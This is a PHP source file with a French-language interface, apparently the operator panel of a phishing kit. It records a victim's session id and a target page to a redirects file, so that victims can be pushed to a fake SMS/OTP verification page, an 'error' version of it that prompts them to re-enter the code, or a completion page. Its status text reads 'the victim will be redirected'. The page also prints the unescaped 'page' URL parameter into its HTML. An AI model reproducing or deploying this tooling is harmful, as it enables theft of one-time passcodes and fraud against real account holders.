<?php

$filename = '../redirect/redirects.txt';
$sessionId = $_GET['id'] ?? '';
$page = $_GET['page'] ?? '';

$recognizedPages = [
    'sms.php'  => 'Vérification SMS/OTP',
    'sms.php?error=true' => 'Vérification SMS/OTP (Erreur)',
    'confirme.php' => 'Terminé',
];

$status = '';
$pageDisplay = '';
$success = false;

if (!empty($sessionId) && !empty($page)) {
    $entry = "$sessionId - $page - 0" . PHP_EOL;
    if (file_put_contents($filename, $entry, FILE_APPEND) !== false) {
        $success = true;
        $status = "La victime va être redirigée.";
        if (isset($recognizedPages[$page])) {
            $pageDisplay = "Page : <br><b>{$recognizedPages[$page]}</b><br>(<code>$page</code>)";
        } else {
            $pageDisplay = "Page : <br><code>$page</code>";
        }
    } else {
        $status = "Erreur : Impossible d'écrire dans le fichier de log.";
    }
} else {
    $status = "Requête invalide. IP ou page manquante.";
}

?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Statut du journal de redirection</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --bg-dark: #181a1b;
            --bg-grey: #232526;
            --bg-light: #2c2f31;
            --white: #fff;
            --grey: #b0b3b8;
            --accent: #4f8cff;
            --success: #4caf50;
            --error: #ff5252;
        }
        body {
            background: linear-gradient(135deg, var(--bg-dark) 0%, var(--bg-grey) 100%);
            color: var(--white);
            font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: var(--bg-light);
            border-radius: 18px;
            box-shadow: 0 8px 32px 0 rgba(0,0,0,0.25);
            padding: 2.5rem 2rem 2rem 2rem;
            min-width: 320px;
            max-width: 90vw;
            text-align: center;
            animation: fadeIn 0.8s cubic-bezier(.4,0,.2,1);
        }
        h1 {
            font-size: 2rem;
            margin-bottom: 0.5rem;
            font-weight: 700;
            letter-spacing: 0.02em;
        }
        .status {
            margin: 1.2rem 0 0.7rem 0;
            font-size: 1.1rem;
            font-weight: 500;
            color: <?= $success ? 'var(--success)' : 'var(--error)' ?>;
            animation: popIn 0.5s;
        }
        .page-info {
            color: var(--grey);
            font-size: 1rem;
            margin-bottom: 1.2rem;
            animation: fadeInUp 0.7s;
        }
        code {
            background: #222;
            color: var(--accent);
            border-radius: 4px;
            padding: 0.1em 0.4em;
            font-size: 0.98em;
        }
        .circle {
            width: 60px;
            height: 60px;
            margin: 0 auto 1.2rem auto;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: <?= $success ? 'linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)' : 'linear-gradient(135deg, #ff5252 0%, #ffb199 100%)' ?>;
            box-shadow: 0 4px 16px 0 rgba(0,0,0,0.18);
            animation: bounceIn 0.7s;
        }
        .circle svg {
            width: 32px;
            height: 32px;
            fill: var(--white);
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.98);}
            to { opacity: 1; transform: scale(1);}
        }
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px);}
            to { opacity: 1; transform: translateY(0);}
        }
        @keyframes popIn {
            from { opacity: 0; transform: scale(0.8);}
            to { opacity: 1; transform: scale(1);}
        }
        @keyframes bounceIn {
            0% { transform: scale(0.7);}
            60% { transform: scale(1.1);}
            80% { transform: scale(0.95);}
            100% { transform: scale(1);}
        }
        @media (max-width: 500px) {
            .container { padding: 1.2rem 0.5rem; min-width: 0;}
            h1 { font-size: 1.3rem;}
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="circle">
            <?php if ($success): ?>
                <!-- Success checkmark SVG -->
                <svg viewBox="0 0 24 24"><path d="M20.285 6.709a1 1 0 0 0-1.414-1.418l-8.285 8.293-3.293-3.293a1 1 0 1 0-1.414 1.414l4 4a1 1 0 0 0 1.414 0l9-9z"/></svg>
            <?php else: ?>
                <!-- Error cross SVG -->
                <svg viewBox="0 0 24 24"><path d="M18.364 5.636a1 1 0 0 0-1.414 0L12 10.586 7.05 5.636A1 1 0 1 0 5.636 7.05L10.586 12l-4.95 4.95a1 1 0 1 0 1.414 1.414L12 13.414l4.95 4.95a1 1 0 0 0 1.414-1.414L13.414 12l4.95-4.95a1 1 0 0 0 0-1.414z"/></svg>
            <?php endif; ?>
        </div>
        <h1><?= $success ? "Enregistré avec succès" : "Requête invalide" ?></h1>
        <div class="status"><?= htmlspecialchars($status) ?></div>
        <?php if ($success): ?>
            <div class="page-info"><?= $pageDisplay ?></div>
        <?php elseif (!empty($page)): ?>
            <div class="page-info"><?= $pageDisplay ?></div>
        <?php endif; ?>
    </div>
</body>
</html>